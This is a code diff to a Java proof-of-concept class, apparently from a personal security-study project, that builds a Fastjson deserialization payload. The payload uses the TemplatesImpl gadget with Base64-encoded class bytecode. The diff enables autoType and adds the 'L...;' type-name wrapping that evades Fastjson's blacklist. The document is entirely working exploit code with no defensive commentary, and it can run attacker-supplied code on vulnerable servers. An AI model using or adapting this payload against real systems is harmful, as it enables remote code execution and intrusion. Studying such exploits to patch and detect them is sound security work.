@@ -9,15 +9,16 @@ import java.util.Base64;
 
 public class exp1 {
     public static void main(String[] args) throws Exception {
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
         byte[] codes = Files.readAllBytes(Paths.get("D:\\java_project\\JavaSecurityStudy\\target\\classes\\ClassLoad\\TemplateCode.class"));
         String bytescode = Base64.getEncoder().encodeToString(codes);
         String payload = "{\n" +
-                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
+                "    \"@type\": \"Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\",\n" +
                 "    \"_bytecodes\": [\""+bytescode+"\"],\n" +
                 "    \"_name\": \"pysnow\",\n" +
                 "    \"_tfactory\": {},\n" +
                 "    \"_outputProperties\": {},\n" +
                 "}";
-        Object obj = JSON.parseObject(payload, Object.class,new ParserConfig(), Feature.SupportNonPublicField);
+        JSON.parseObject(payload, Object.class,new ParserConfig(), Feature.SupportNonPublicField);
     }
 }
